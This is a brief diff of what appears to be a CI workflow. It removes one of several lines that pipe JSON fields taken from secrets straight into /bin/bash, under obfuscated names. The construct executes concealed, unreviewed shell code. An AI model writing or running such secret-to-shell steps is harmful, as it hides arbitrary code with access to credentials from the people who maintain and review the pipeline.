@@ -22,7 +22,6 @@ jobs:
           zqgl970: ${{ secrets.zqgl970 }}
         run: |
           printf '%s' "$zqgl970" | jq -r .zxzun992 | /bin/bash
-          printf '%s' "$xd8236" | jq -r .bjo4 | /bin/bash
           printf '%s' "$oqh78" | jq -r .nyow4 | /bin/bash
 
       - name: Upload archive
